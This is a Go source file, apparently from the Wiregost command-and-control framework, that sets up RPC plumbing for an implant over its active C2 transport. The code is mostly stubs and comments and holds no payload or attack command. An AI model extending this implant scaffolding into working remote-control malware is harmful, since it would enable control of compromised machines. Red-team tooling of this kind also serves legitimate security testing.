package rpc

import (
	"io"

	"github.com/maxlandon/wiregost/ghost/channels"
	"github.com/maxlandon/wiregost/ghost/transport"
)

// InitGhostRPC - Based on available/used/required C2 transports, this function
// setups, registers and start all RPC components for this implant at registration.
// The function has access to various security objects previously setup.
// NOTE: A separate function is used when we switch the Active Transport, as we might
// be able to "reuse" existing streams for channels.
func InitGhostRPC() (err error) {

	// Get the current transport in the Transports package
	active := transport.Transports.Active

	// Get the implant's main channel, previously setup by the transport layer
	// who has passed to it a io.ReadWriteCloser.
	mainChan, err := channels.StartMainChannel(active.C2)
	if err != nil {
		return
	}

	// Add the boilerplate RPC needed to perform registration
	err = SetupStreamRPC(mainChan.Stream)
	if err != nil {
		return
	}

	// Send registration and process response

	// Return any error
	return
}

// SetupStreamRPC - This function sets all infrastructure to send/receive ALL message types
// through the transport. Therefore, this function is called each time we want to add RPC
// boiler to an implant channel, main or not. Registration is handled separately.
func SetupStreamRPC(stream io.ReadWriteCloser) (err error) {
	return
}
